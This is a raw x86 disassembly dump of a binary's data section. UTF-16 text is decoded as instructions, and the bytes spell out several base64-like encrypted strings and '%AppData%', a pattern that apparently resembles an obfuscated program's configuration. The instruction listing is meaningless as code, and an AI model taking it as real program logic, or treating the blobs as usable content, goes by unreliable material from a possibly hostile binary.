  4096ca:	00 72 00             	add    %dh,0x0(%edx)
  4096cd:	75 00                	jne    0x4096cf
  4096cf:	4b                   	dec    %ebx
  4096d0:	00 63 00             	add    %ah,0x0(%ebx)
  4096d3:	41                   	inc    %ecx
  4096d4:	00 64 00 32          	add    %ah,0x32(%eax,%eax,1)
  4096d8:	00 57 00             	add    %dl,0x0(%edi)
  4096db:	36 00 39             	add    %bh,%ss:(%ecx)
  4096de:	00 74 00 32          	add    %dh,0x32(%eax,%eax,1)
  4096e2:	00 50 00             	add    %dl,0x0(%eax)
  4096e5:	65 00 58 00          	add    %bl,%gs:0x0(%eax)
  4096e9:	4c                   	dec    %esp
  4096ea:	00 30                	add    %dh,(%eax)
  4096ec:	00 58 00             	add    %bl,0x0(%eax)
  4096ef:	76 00                	jbe    0x4096f1
  4096f1:	00 80 d9 44 00 37    	add    %al,0x370044d9(%eax)
  4096f7:	00 79 00             	add    %bh,0x0(%ecx)
  4096fa:	38 00                	cmp    %al,(%eax)
  4096fc:	7a 00                	jp     0x4096fe
  4096fe:	70 00                	jo     0x409700
  409700:	78 00                	js     0x409702
  409702:	42                   	inc    %edx
  409703:	00 48 00             	add    %cl,0x0(%eax)
  409706:	68 00 65 00 63       	push   $0x63006500
  40970b:	00 46 00             	add    %al,0x0(%esi)
  40970e:	32 00                	xor    (%eax),%al
  409710:	4f                   	dec    %edi
  409711:	00 45 00             	add    %al,0x0(%ebp)
  409714:	44                   	inc    %esp
  409715:	00 6f 00             	add    %ch,0x0(%edi)
  409718:	57                   	push   %edi
  409719:	00 53 00             	add    %dl,0x0(%ebx)
  40971c:	63 00                	arpl   %eax,(%eax)
  40971e:	6c                   	insb   (%dx),%es:(%edi)
  40971f:	00 5a 00             	add    %bl,0x0(%edx)
  409722:	42                   	inc    %edx
  409723:	00 4c 00 5a          	add    %cl,0x5a(%eax,%eax,1)
  409727:	00 33                	add    %dh,(%ebx)
  409729:	00 74 00 71          	add    %dh,0x71(%eax,%eax,1)
  40972d:	00 61 00             	add    %ah,0x0(%ecx)
  409730:	52                   	push   %edx
  409731:	00 41 00             	add    %al,0x0(%ecx)
  409734:	6c                   	insb   (%dx),%es:(%edi)
  409735:	00 53 00             	add    %dl,0x0(%ebx)
  409738:	34 00                	xor    $0x0,%al
  40973a:	53                   	push   %ebx
  40973b:	00 41 00             	add    %al,0x0(%ecx)
  40973e:	46                   	inc    %esi
  40973f:	00 37                	add    %dh,(%edi)
  409741:	00 7a 00             	add    %bh,0x0(%edx)
  409744:	49                   	dec    %ecx
  409745:	00 4a 00             	add    %cl,0x0(%edx)
  409748:	5a                   	pop    %edx
  409749:	00 4c 00 78          	add    %cl,0x78(%eax,%eax,1)
  40974d:	00 48 00             	add    %cl,0x0(%eax)
  409750:	2f                   	das
  409751:	00 62 00             	add    %ah,0x0(%edx)
  409754:	39 00                	cmp    %eax,(%eax)
  409756:	63 00                	arpl   %eax,(%eax)
  409758:	31 00                	xor    %eax,(%eax)
  40975a:	44                   	inc    %esp
  40975b:	00 6e 00             	add    %ch,0x0(%esi)
  40975e:	58                   	pop    %eax
  40975f:	00 41 00             	add    %al,0x0(%ecx)
  409762:	31 00                	xor    %eax,(%eax)
  409764:	7a 00                	jp     0x409766
  409766:	70 00                	jo     0x409768
  409768:	4e                   	dec    %esi
  409769:	00 30                	add    %dh,(%eax)
  40976b:	00 2f                	add    %ch,(%edi)
  40976d:	00 73 00             	add    %dh,0x0(%ebx)
  409770:	39 00                	cmp    %eax,(%eax)
  409772:	50                   	push   %eax
  409773:	00 62 00             	add    %ah,0x0(%edx)
  409776:	77 00                	ja     0x409778
  409778:	63 00                	arpl   %eax,(%eax)
  40977a:	6f                   	outsl  %ds:(%esi),(%dx)
  40977b:	00 53 00             	add    %dl,0x0(%ebx)
  40977e:	51                   	push   %ecx
  40977f:	00 78 00             	add    %bh,0x0(%eax)
  409782:	6f                   	outsl  %ds:(%esi),(%dx)
  409783:	00 66 00             	add    %ah,0x0(%esi)
  409786:	57                   	push   %edi
  409787:	00 4d 00             	add    %cl,0x0(%ebp)
  40978a:	7a 00                	jp     0x40978c
  40978c:	76 00                	jbe    0x40978e
  40978e:	6a 00                	push   $0x0
  409790:	52                   	push   %edx
  409791:	00 52 00             	add    %dl,0x0(%edx)
  409794:	42                   	inc    %edx
  409795:	00 30                	add    %dh,(%eax)
  409797:	00 61 00             	add    %ah,0x0(%ecx)
  40979a:	71 00                	jno    0x40979c
  40979c:	52                   	push   %edx
  40979d:	00 6b 00             	add    %ch,0x0(%ebx)
  4097a0:	4e                   	dec    %esi
  4097a1:	00 45 00             	add    %al,0x0(%ebp)
  4097a4:	45                   	inc    %ebp
  4097a5:	00 2f                	add    %ch,(%edi)
  4097a7:	00 69 00             	add    %ch,0x0(%ecx)
  4097aa:	4b                   	dec    %ebx
  4097ab:	00 30                	add    %dh,(%eax)
  4097ad:	00 35 00 33 00 42    	add    %dh,0x42003300
  4097b3:	00 65 00             	add    %ah,0x0(%ebp)
  4097b6:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  4097ba:	6e                   	outsb  %ds:(%esi),(%dx)
  4097bb:	00 57 00             	add    %dl,0x0(%edi)
  4097be:	67 00 6b 00          	add    %ch,0x0(%bp,%di)
  4097c2:	62 00                	bound  %eax,(%eax)
  4097c4:	79 00                	jns    0x4097c6
  4097c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4097c7:	00 34 00             	add    %dh,(%eax,%eax,1)
  4097ca:	3d 00 00 80 b1       	cmp    $0xb1800000,%eax
  4097cf:	7a 00                	jp     0x4097d1
  4097d1:	6e                   	outsb  %ds:(%esi),(%dx)
  4097d2:	00 68 00             	add    %ch,0x0(%eax)
  4097d5:	77 00                	ja     0x4097d7
  4097d7:	64 00 44 00 37       	add    %al,%fs:0x37(%eax,%eax,1)
  4097dc:	00 32                	add    %dh,(%edx)
  4097de:	00 41 00             	add    %al,0x0(%ecx)
  4097e1:	5a                   	pop    %edx
  4097e2:	00 58 00             	add    %bl,0x0(%eax)
  4097e5:	6d                   	insl   (%dx),%es:(%edi)
  4097e6:	00 4c 00 31          	add    %cl,0x31(%eax,%eax,1)
  4097ea:	00 78 00             	add    %bh,0x0(%eax)
  4097ed:	63 00                	arpl   %eax,(%eax)
  4097ef:	41                   	inc    %ecx
  4097f0:	00 6a 00             	add    %ch,0x0(%edx)
  4097f3:	6b 00 68             	imul   $0x68,(%eax),%eax
  4097f6:	00 4e 00             	add    %cl,0x0(%esi)
  4097f9:	45                   	inc    %ebp
  4097fa:	00 37                	add    %dh,(%edi)
  4097fc:	00 52 00             	add    %dl,0x0(%edx)
  4097ff:	6c                   	insb   (%dx),%es:(%edi)
  409800:	00 69 00             	add    %ch,0x0(%ecx)
  409803:	43                   	inc    %ebx
  409804:	00 39                	add    %bh,(%ecx)
  409806:	00 38                	add    %bh,(%eax)
  409808:	00 76 00             	add    %dh,0x0(%esi)
  40980b:	48                   	dec    %eax
  40980c:	00 48 00             	add    %cl,0x0(%eax)
  40980f:	36 00 44 00 41       	add    %al,%ss:0x41(%eax,%eax,1)
  409814:	00 34 00             	add    %dh,(%eax,%eax,1)
  409817:	4b                   	dec    %ebx
  409818:	00 65 00             	add    %ah,0x0(%ebp)
  40981b:	75 00                	jne    0x40981d
  40981d:	6d                   	insl   (%dx),%es:(%edi)
  40981e:	00 44 00 70          	add    %al,0x70(%eax,%eax,1)
  409822:	00 68 00             	add    %ch,0x0(%eax)
  409825:	56                   	push   %esi
  409826:	00 68 00             	add    %ch,0x0(%eax)
  409829:	43                   	inc    %ebx
  40982a:	00 35 00 64 00 69    	add    %dh,0x69006400
  409830:	00 67 00             	add    %ah,0x0(%edi)
  409833:	62 00                	bound  %eax,(%eax)
  409835:	76 00                	jbe    0x409837
  409837:	52                   	push   %edx
  409838:	00 78 00             	add    %bh,0x0(%eax)
  40983b:	38 00                	cmp    %al,(%eax)
  40983d:	30 00                	xor    %al,(%eax)
  40983f:	38 00                	cmp    %al,(%eax)
  409841:	5a                   	pop    %edx
  409842:	00 50 00             	add    %dl,0x0(%eax)
  409845:	69 00 48 00 73 00    	imul   $0x730048,(%eax),%eax
  40984b:	4e                   	dec    %esi
  40984c:	00 39                	add    %bh,(%ecx)
  40984e:	00 63 00             	add    %ah,0x0(%ebx)
  409851:	54                   	push   %esp
  409852:	00 53 00             	add    %dl,0x0(%ebx)
  409855:	54                   	push   %esp
  409856:	00 77 00             	add    %dh,0x0(%edi)
  409859:	4e                   	dec    %esi
  40985a:	00 2b                	add    %ch,(%ebx)
  40985c:	00 59 00             	add    %bl,0x0(%ecx)
  40985f:	51                   	push   %ecx
  409860:	00 6a 00             	add    %ch,0x0(%edx)
  409863:	74 00                	je     0x409865
  409865:	61                   	popa
  409866:	00 46 00             	add    %al,0x0(%esi)
  409869:	32 00                	xor    (%eax),%al
  40986b:	7a 00                	jp     0x40986d
  40986d:	76 00                	jbe    0x40986f
  40986f:	47                   	inc    %edi
  409870:	00 65 00             	add    %ah,0x0(%ebp)
  409873:	54                   	push   %esp
  409874:	00 6d 00             	add    %ch,0x0(%ebp)
  409877:	41                   	inc    %ecx
  409878:	00 41 00             	add    %al,0x0(%ecx)
  40987b:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  409880:	80 b1 46 00 71 00 37 	xorb   $0x37,0x710046(%ecx)
  409887:	00 48 00             	add    %cl,0x0(%eax)
  40988a:	36 00 2b             	add    %ch,%ss:(%ebx)
  40988d:	00 52 00             	add    %dl,0x0(%edx)
  409890:	65 00 6c 00 32       	add    %ch,%gs:0x32(%eax,%eax,1)
  409895:	00 52 00             	add    %dl,0x0(%edx)
  409898:	45                   	inc    %ebp
  409899:	00 49 00             	add    %cl,0x0(%ecx)
  40989c:	41                   	inc    %ecx
  40989d:	00 37                	add    %dh,(%edi)
  40989f:	00 4e 00             	add    %cl,0x0(%esi)
  4098a2:	64 00 6e 00          	add    %ch,%fs:0x0(%esi)
  4098a6:	71 00                	jno    0x4098a8
  4098a8:	44                   	inc    %esp
  4098a9:	00 69 00             	add    %ch,0x0(%ecx)
  4098ac:	61                   	popa
  4098ad:	00 76 00             	add    %dh,0x0(%esi)
  4098b0:	44                   	inc    %esp
  4098b1:	00 79 00             	add    %bh,0x0(%ecx)
  4098b4:	6e                   	outsb  %ds:(%esi),(%dx)
  4098b5:	00 65 00             	add    %ah,0x0(%ebp)
  4098b8:	72 00                	jb     0x4098ba
  4098ba:	43                   	inc    %ebx
  4098bb:	00 6f 00             	add    %ch,0x0(%edi)
  4098be:	4c                   	dec    %esp
  4098bf:	00 61 00             	add    %ah,0x0(%ecx)
  4098c2:	4e                   	dec    %esi
  4098c3:	00 37                	add    %dh,(%edi)
  4098c5:	00 4c 00 69          	add    %cl,0x69(%eax,%eax,1)
  4098c9:	00 6e 00             	add    %ch,0x0(%esi)
  4098cc:	46                   	inc    %esi
  4098cd:	00 44 00 48          	add    %al,0x48(%eax,%eax,1)
  4098d1:	00 45 00             	add    %al,0x0(%ebp)
  4098d4:	50                   	push   %eax
  4098d5:	00 64 00 72          	add    %ah,0x72(%eax,%eax,1)
  4098d9:	00 4b 00             	add    %cl,0x0(%ebx)
  4098dc:	39 00                	cmp    %eax,(%eax)
  4098de:	48                   	dec    %eax
  4098df:	00 64 00 45          	add    %ah,0x45(%eax,%eax,1)
  4098e3:	00 59 00             	add    %bl,0x0(%ecx)
  4098e6:	72 00                	jb     0x4098e8
  4098e8:	47                   	inc    %edi
  4098e9:	00 30                	add    %dh,(%eax)
  4098eb:	00 2b                	add    %ch,(%ebx)
  4098ed:	00 43 00             	add    %al,0x0(%ebx)
  4098f0:	4d                   	dec    %ebp
  4098f1:	00 34 00             	add    %dh,(%eax,%eax,1)
  4098f4:	70 00                	jo     0x4098f6
  4098f6:	39 00                	cmp    %eax,(%eax)
  4098f8:	33 00                	xor    (%eax),%eax
  4098fa:	4b                   	dec    %ebx
  4098fb:	00 2f                	add    %ch,(%edi)
  4098fd:	00 55 00             	add    %dl,0x0(%ebp)
  409900:	63 00                	arpl   %eax,(%eax)
  409902:	4f                   	dec    %edi
  409903:	00 77 00             	add    %dh,0x0(%edi)
  409906:	30 00                	xor    %al,(%eax)
  409908:	45                   	inc    %ebp
  409909:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  40990d:	00 4e 00             	add    %cl,0x0(%esi)
  409910:	4e                   	dec    %esi
  409911:	00 46 00             	add    %al,0x0(%esi)
  409914:	78 00                	js     0x409916
  409916:	58                   	pop    %eax
  409917:	00 38                	add    %bh,(%eax)
  409919:	00 35 00 51 00 74    	add    %dh,0x74005100
  40991f:	00 2b                	add    %ch,(%ebx)
  409921:	00 78 00             	add    %bh,0x0(%eax)
  409924:	32 00                	xor    (%eax),%al
  409926:	68 00 46 00 46       	push   $0x46004600
  40992b:	00 67 00             	add    %ah,0x0(%edi)
  40992e:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  409933:	13 25 00 41 00 70    	adc    0x70004100,%esp
  409939:	00 70 00             	add    %dh,0x0(%eax)
  40993c:	44                   	inc    %esp
  40993d:	00 61 00             	add    %ah,0x0(%ecx)
  409940:	74 00                	je     0x409942
  409942:	61                   	popa
  409943:	00 25 00 00 01 00    	add    %ah,0x10000
  409949:	59                   	pop    %ecx
  40994a:	64 00 33             	add    %dh,%fs:(%ebx)
  40994d:	00 4a 00             	add    %cl,0x0(%edx)
  409950:	59                   	pop    %ecx
  409951:	00 59 00             	add    %bl,0x0(%ecx)
  409954:	33 00                	xor    (%eax),%eax
  409956:	64 00 52 00          	add    %dl,%fs:0x0(%edx)
  40995a:	62 00                	bound  %eax,(%eax)
  40995c:	58                   	pop    %eax
  40995d:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  409961:	00 57 00             	add    %dl,0x0(%edi)
  409964:	6d                   	insl   (%dx),%es:(%edi)
  409965:	00 6c 00 43          	add    %ch,0x43(%eax,%eax,1)
  409969:	00 64 00 57          	add    %ah,0x57(%eax,%eax,1)
  40996d:	00 51 00             	add    %dl,0x0(%ecx)
  409970:	30 00                	xor    %al,(%eax)
  409972:	61                   	popa
  409973:	00 56 00             	add    %dl,0x0(%esi)
  409976:	5a                   	pop    %edx
  409977:	00 36                	add    %dh,(%esi)
  409979:	00 65 00             	add    %ah,0x0(%ebp)
  40997c:	44                   	inc    %esp
  40997d:	00 52 00             	add    %dl,0x0(%edx)
  409980:	5a                   	pop    %edx
  409981:	00 65 00             	add    %ah,0x0(%ebp)
  409984:	56                   	push   %esi
  409985:	00 42 00             	add    %al,0x0(%edx)
  409988:	72 00                	jb     0x40998a
  40998a:	51                   	push   %ecx
  40998b:	00 31                	add    %dh,(%ecx)
  40998d:	00 4e 00             	add    %cl,0x0(%esi)
  409990:	44                   	inc    %esp
  409991:	00 56 00             	add    %dl,0x0(%esi)
  409994:	55                   	push   %ebp
  409995:	00 4a 00             	add    %cl,0x0(%edx)
  409998:	79 00                	jns    0x40999a
  40999a:	64 00 47 00          	add    %al,%fs:0x0(%edi)
  40999e:	73 00                	jae    0x4099a0
  4099a0:	3d 00 00 80 b1       	cmp    $0xb1800000,%eax
  4099a5:	67 00 33             	add    %dh,(%bp,%di)
  4099a8:	00 67 00             	add    %ah,0x0(%edi)
  4099ab:	32 00                	xor    (%eax),%al
  4099ad:	46                   	inc    %esi
  4099ae:	00 7a 00             	add    %bh,0x0(%edx)
  4099b1:	65 00 33             	add    %dh,%gs:(%ebx)
  4099b4:	00 37                	add    %dh,(%edi)
  4099b6:	00 2b                	add    %ch,(%ebx)
  4099b8:	00 4a 00             	add    %cl,0x0(%edx)
  4099bb:	4e                   	dec    %esi
  4099bc:	00 75 00             	add    %dh,0x0(%ebp)
  4099bf:	72 00                	jb     0x4099c1
  4099c1:	78 00                	js     0x4099c3
  4099c3:	2b 00                	sub    (%eax),%eax
  4099c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4099c6:	00 42 00             	add    %al,0x0(%edx)
  4099c9:	62 00                	bound  %eax,(%eax)
  4099cb:	6e                   	outsb  %ds:(%esi),(%dx)
  4099cc:	00 30                	add    %dh,(%eax)
  4099ce:	00 32                	add    %dh,(%edx)
  4099d0:	00 48 00             	add    %cl,0x0(%eax)
  4099d3:	47                   	inc    %edi
  4099d4:	00 43 00             	add    %al,0x0(%ebx)
  4099d7:	30 00                	xor    %al,(%eax)
  4099d9:	2b 00                	sub    (%eax),%eax
  4099db:	6a 00                	push   $0x0
  4099dd:	6c                   	insb   (%dx),%es:(%edi)
  4099de:	00 47 00             	add    %al,0x0(%edi)
  4099e1:	4a                   	dec    %edx
  4099e2:	00 76 00             	add    %dh,0x0(%esi)
  4099e5:	4c                   	dec    %esp
  4099e6:	00 6c 00 31          	add    %ch,0x31(%eax,%eax,1)
  4099ea:	00 43 00             	add    %al,0x0(%ebx)
  4099ed:	72 00                	jb     0x4099ef
  4099ef:	55                   	push   %ebp
  4099f0:	00 66 00             	add    %ah,0x0(%esi)
  4099f3:	54                   	push   %esp
  4099f4:	00 6e 00             	add    %ch,0x0(%esi)
  4099f7:	4f                   	dec    %edi
  4099f8:	00 47 00             	add    %al,0x0(%edi)
  4099fb:	45                   	inc    %ebp
  4099fc:	00 66 00             	add    %ah,0x0(%esi)
  4099ff:	68 00 31 00 53       	push   $0x53003100
  409a04:	00 74 00 77          	add    %dh,0x77(%eax,%eax,1)
  409a08:	00 43 00             	add    %al,0x0(%ebx)
  409a0b:	66 00 35 00 2b 00 65 	data16 add %dh,0x65002b00
  409a12:	00 5a 00             	add    %bl,0x0(%edx)
  409a15:	66 00 76 00          	data16 add %dh,0x0(%esi)
  409a19:	4f                   	dec    %edi
  409a1a:	00 51 00             	add    %dl,0x0(%ecx)
  409a1d:	65 00 35 00 47 00 78 	add    %dh,%gs:0x78004700
  409a24:	00 38                	add    %bh,(%eax)
  409a26:	00 61 00             	add    %ah,0x0(%ecx)
  409a29:	4f                   	dec    %edi
  409a2a:	00 6d 00             	add    %ch,0x0(%ebp)
  409a2d:	78 00                	js     0x409a2f
  409a2f:	79 00                	jns    0x409a31
  409a31:	2f                   	das
  409a32:	00 38                	add    %bh,(%eax)
  409a34:	00 73 00             	add    %dh,0x0(%ebx)
  409a37:	74 00                	je     0x409a39
  409a39:	43                   	inc    %ebx
  409a3a:	00 6e 00             	add    %ch,0x0(%esi)
  409a3d:	67 00 4c 00          	add    %cl,0x0(%si)
  409a41:	71 00                	jno    0x409a43
  409a43:	6d                   	insl   (%dx),%es:(%edi)
  409a44:	00 51 00             	add    %dl,0x0(%ecx)
  409a47:	69 00 61 00 6b 00    	imul   $0x6b0061,(%eax),%eax
  409a4d:	69 00 51 00 3d 00    	imul   $0x3d0051,(%eax),%eax
  409a53:	3d 00 00 92 59       	cmp    $0x59920000,%eax
  409a58:	55                   	push   %ebp
  409a59:	00 72 00             	add    %dh,0x0(%edx)
  409a5c:	59                   	pop    %ecx
  409a5d:	00 65 00             	add    %ah,0x0(%ebp)
  409a60:	6b 00 34             	imul   $0x34,(%eax),%eax
  409a63:	00 4d 00             	add    %cl,0x0(%ebp)
  409a66:	49                   	dec    %ecx
  409a67:	00 56 00             	add    %dl,0x0(%esi)
  409a6a:	53                   	push   %ebx
  409a6b:	00 57 00             	add    %dl,0x0(%edi)
  409a6e:	52                   	push   %edx
  409a6f:	00 6c 00 5a          	add    %ch,0x5a(%eax,%eax,1)
  409a73:	00 4b 00             	add    %cl,0x0(%ebx)
  409a76:	54                   	push   %esp
  409a77:	00 4e 00             	add    %cl,0x0(%esi)
  409a7a:	6f                   	outsl  %ds:(%esi),(%dx)
  409a7b:	00 61 00             	add    %ah,0x0(%ecx)
  409a7e:	56                   	push   %esi
  409a7f:	00 65 00             	add    %ah,0x0(%ebp)
  409a82:	53                   	push   %ebx
  409a83:	00 77 00             	add    %dh,0x0(%edi)
  409a86:	6b 00 63             	imul   $0x63,(%eax),%eax
  409a89:	00 67 00             	add    %ah,0x0(%edi)
  409a8c:	53                   	push   %ebx
  409a8d:	00 36                	add    %dh,(%esi)
  409a8f:	00 4a 00             	add    %cl,0x0(%edx)
  409a92:	55                   	push   %ebp
  409a93:	00 2b                	add    %ch,(%ebx)
  409a95:	00 4c 00 38          	add    %cl,0x38(%eax,%eax,1)
  409a99:	00 33                	add    %dh,(%ebx)
  409a9b:	00 59 00             	add    %bl,0x0(%ecx)
  409a9e:	71 00                	jno    0x409aa0
  409aa0:	71 00                	jno    0x409aa2
  409aa2:	56                   	push   %esi
  409aa3:	00 67 00             	add    %ah,0x0(%edi)
  409aa6:	4b                   	dec    %ebx
  409aa7:	00 4a 00             	add    %cl,0x0(%edx)
  409aaa:	62 00                	bound  %eax,(%eax)
  409aac:	52                   	push   %edx
  409aad:	00 4e 00             	add    %cl,0x0(%esi)
  409ab0:	67 00 6e 00          	add    %ch,0x0(%bp)
  409ab4:	6b 00 56             	imul   $0x56,(%eax),%eax
  409ab7:	00 4b 00             	add    %cl,0x0(%ebx)
  409aba:	56                   	push   %esi
  409abb:	00 50 00             	add    %dl,0x0(%eax)
  409abe:	42                   	inc    %edx
  409abf:	00 73 00             	add    %dh,0x0(%ebx)
  409ac2:	4f                   	dec    %edi
  409ac3:	00 32                	add    %dh,(%edx)
  409ac5:	00 58 00             	add    %bl,0x0(%eax)
  409ac8:	4d                   	dec    %ebp
  409ac9:	00 66 00             	add    %ah,0x0(%esi)
  409acc:	69 00 6b 00 30 00    	imul   $0x30006b,(%eax),%eax
  409ad2:	37                   	aaa
  409ad3:	00 46 00             	add    %al,0x0(%esi)
  409ad6:	6f                   	outsl  %ds:(%esi),(%dx)
  409ad7:	00 30                	add    %dh,(%eax)
  409ad9:	00 54 00 51          	add    %dl,0x51(%eax,%eax,1)
  409add:	00 58 00             	add    %bl,0x0(%eax)
  409ae0:	2f                   	das
  409ae1:	00 51 00             	add    %dl,0x0(%ecx)
  409ae4:	51                   	push   %ecx
  409ae5:	00 6e 00             	add    %ch,0x0(%esi)
  409ae8:	45                   	inc    %ebp
  409ae9:	00 65 00             	add    %ah,0x0(%ebp)
  409aec:	34 00                	xor    $0x0,%al
  409aee:	38 00                	cmp    %al,(%eax)
  409af0:	59                   	pop    %ecx
  409af1:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  409af5:	00 52 00             	add    %dl,0x0(%edx)
  409af8:	36 00 50 00          	add    %dl,%ss:0x0(%eax)
  409afc:	6e                   	outsb  %ds:(%esi),(%dx)
  409afd:	00 51 00             	add    %dl,0x0(%ecx)
  409b00:	34 00                	xor    $0x0,%al
  409b02:	31 00                	xor    %eax,(%eax)
  409b04:	43                   	inc    %ebx
  409b05:	00 77 00             	add    %dh,0x0(%edi)
  409b08:	6a 00                	push   $0x0
  409b0a:	69 00 4a 00 39 00    	imul   $0x39004a,(%eax),%eax
  409b10:	39 00                	cmp    %eax,(%eax)
  409b12:	44                   	inc    %esp
  409b13:	00 36                	add    %dh,(%esi)
  409b15:	00 4f 00             	add    %cl,0x0(%edi)
  409b18:	35 00 69 00 42       	xor    $0x42006900,%eax
  409b1d:	00 52 00             	add    %dl,0x0(%edx)
  409b20:	63 00                	arpl   %eax,(%eax)
  409b22:	2b 00                	sub    (%eax),%eax
  409b24:	72 00                	jb     0x409b26
  409b26:	4f                   	dec    %edi
  409b27:	00 71 00             	add    %dh,0x0(%ecx)
  409b2a:	43                   	inc    %ebx
  409b2b:	00 68 00             	add    %ch,0x0(%eax)
  409b2e:	4d                   	dec    %ebp
  409b2f:	00 54 00 61          	add    %dl,0x61(%eax,%eax,1)
  409b33:	00 72 00             	add    %dh,0x0(%edx)
  409b36:	41                   	inc    %ecx
  409b37:	00 33                	add    %dh,(%ebx)
  409b39:	00 4e 00             	add    %cl,0x0(%esi)
  409b3c:	62 00                	bound  %eax,(%eax)
  409b3e:	73 00                	jae    0x409b40
  409b40:	46                   	inc    %esi
  409b41:	00 56 00             	add    %dl,0x0(%esi)
  409b44:	2b 00                	sub    (%eax),%eax
  409b46:	73 00                	jae    0x409b48
  409b48:	6f                   	outsl  %ds:(%esi),(%dx)
  409b49:	00 77 00             	add    %dh,0x0(%edi)
  409b4c:	58                   	pop    %eax
  409b4d:	00 39                	add    %bh,(%ecx)
  409b4f:	00 75 00             	add    %dh,0x0(%ebp)
  409b52:	61                   	popa
  409b53:	00 78 00             	add    %bh,0x0(%eax)
  409b56:	74 00                	je     0x409b58
  409b58:	59                   	pop    %ecx
  409b59:	00 66 00             	add    %ah,0x0(%esi)
  409b5c:	34 00                	xor    $0x0,%al
  409b5e:	4a                   	dec    %edx
  409b5f:	00 69 00             	add    %ch,0x0(%ecx)
  409b62:	57                   	push   %edi
  409b63:	00 57 00             	add    %dl,0x0(%edi)
  409b66:	6f                   	outsl  %ds:(%esi),(%dx)
  409b67:	00 61 00             	add    %ah,0x0(%ecx)
  409b6a:	78 00                	js     0x409b6c
  409b6c:	75 00                	jne    0x409b6e
  409b6e:	77 00                	ja     0x409b70
  409b70:	35 00 30 00 35       	xor    $0x35003000,%eax
  409b75:	00 70 00             	add    %dh,0x0(%eax)
  409b78:	70 00                	jo     0x409b7a
  409b7a:	32 00                	xor    (%eax),%al
  409b7c:	76 00                	jbe    0x409b7e
  409b7e:	52                   	push   %edx
  409b7f:	00 34 00             	add    %dh,(%eax,%eax,1)
  409b82:	72 00                	jb     0x409b84
  409b84:	59                   	pop    %ecx
  409b85:	00 75 00             	add    %dh,0x0(%ebp)
  409b88:	67 00 51 00          	add    %dl,0x0(%bx,%di)
  409b8c:	42                   	inc    %edx
  409b8d:	00 2b                	add    %ch,(%ebx)
  409b8f:	00 4f 00             	add    %cl,0x0(%edi)
  409b92:	56                   	push   %esi
  409b93:	00 53 00             	add    %dl,0x0(%ebx)
  409b96:	37                   	aaa
  409b97:	00 61 00             	add    %ah,0x0(%ecx)
  409b9a:	6b 00 2b             	imul   $0x2b,(%eax),%eax
  409b9d:	00 44 00 78          	add    %al,0x78(%eax,%eax,1)
  409ba1:	00 44 00 78          	add    %al,0x78(%eax,%eax,1)
  409ba5:	00 6d 00             	add    %ch,0x0(%ebp)
  409ba8:	4e                   	dec    %esi
  409ba9:	00 4c 00 36          	add    %cl,0x36(%eax,%eax,1)
  409bad:	00 72 00             	add    %dh,0x0(%edx)
  409bb0:	6f                   	outsl  %ds:(%esi),(%dx)
  409bb1:	00 48 00             	add    %cl,0x0(%eax)
  409bb4:	54                   	push   %esp
  409bb5:	00 39                	add    %bh,(%ecx)
  409bb7:	00 38                	add    %bh,(%eax)
  409bb9:	00 6b 00             	add    %ch,0x0(%ebx)
  409bbc:	34 00                	xor    $0x0,%al
  409bbe:	79 00                	jns    0x409bc0
  409bc0:	4a                   	dec    %edx
  409bc1:	00 67 00             	add    %ah,0x0(%edi)
  409bc4:	62 00                	bound  %eax,(%eax)
  409bc6:	7a 00                	jp     0x409bc8
  409bc8:	4b                   	dec    %ebx
  409bc9:	00 39                	add    %bh,(%ecx)
  409bcb:	00 6d 00             	add    %ch,0x0(%ebp)
  409bce:	68 00 39 00 42       	push   $0x42003900
  409bd3:	00 59 00             	add    %bl,0x0(%ecx)
  409bd6:	38 00                	cmp    %al,(%eax)
  409bd8:	76 00                	jbe    0x409bda
  409bda:	45                   	inc    %ebp
  409bdb:	00 58 00             	add    %bl,0x0(%eax)
  409bde:	73 00                	jae    0x409be0
  409be0:	52                   	push   %edx
  409be1:	00 42 00             	add    %al,0x0(%edx)
  409be4:	64 00 36             	add    %dh,%fs:(%esi)
  409be7:	00 61 00             	add    %ah,0x0(%ecx)
  409bea:	4a                   	dec    %edx
  409beb:	00 56 00             	add    %dl,0x0(%esi)
  409bee:	31 00                	xor    %eax,(%eax)
  409bf0:	54                   	push   %esp
  409bf1:	00 4a 00             	add    %cl,0x0(%edx)
  409bf4:	62 00                	bound  %eax,(%eax)
  409bf6:	4a                   	dec    %edx
  409bf7:	00 49 00             	add    %cl,0x0(%ecx)
  409bfa:	44                   	inc    %esp
  409bfb:	00 55 00             	add    %dl,0x0(%ebp)
  409bfe:	2b 00                	sub    (%eax),%eax
  409c00:	71 00                	jno    0x409c02
  409c02:	38 00                	cmp    %al,(%eax)
  409c04:	6c                   	insb   (%dx),%es:(%edi)
  409c05:	00 79 00             	add    %bh,0x0(%ecx)
  409c08:	31 00                	xor    %eax,(%eax)
  409c0a:	38 00                	cmp    %al,(%eax)
  409c0c:	51                   	push   %ecx
  409c0d:	00 73 00             	add    %dh,0x0(%ebx)
  409c10:	66 00 76 00          	data16 add %dh,0x0(%esi)
  409c14:	51                   	push   %ecx
  409c15:	00 64 00 43          	add    %ah,0x43(%eax,%eax,1)
  409c19:	00 58 00             	add    %bl,0x0(%eax)
  409c1c:	6b 00 6f             	imul   $0x6f,(%eax),%eax
  409c1f:	00 72 00             	add    %dh,0x0(%edx)
  409c22:	6f                   	outsl  %ds:(%esi),(%dx)
  409c23:	00 61 00             	add    %ah,0x0(%ecx)
  409c26:	46                   	inc    %esi
  409c27:	00 36                	add    %dh,(%esi)
  409c29:	00 43 00             	add    %al,0x0(%ebx)
  409c2c:	38 00                	cmp    %al,(%eax)
  409c2e:	46                   	inc    %esi
  409c2f:	00 50 00             	add    %dl,0x0(%eax)
  409c32:	75 00                	jne    0x409c34
  409c34:	4e                   	dec    %esi
  409c35:	00 4b 00             	add    %cl,0x0(%ebx)
  409c38:	35 00 59 00 46       	xor    $0x46005900,%eax
  409c3d:	00 47 00             	add    %al,0x0(%edi)
  409c40:	62 00                	bound  %eax,(%eax)
  409c42:	6a 00                	push   $0x0
  409c44:	34 00                	xor    $0x0,%al
  409c46:	57                   	push   %edi
  409c47:	00 2b                	add    %ch,(%ebx)
  409c49:	00 49 00             	add    %cl,0x0(%ecx)
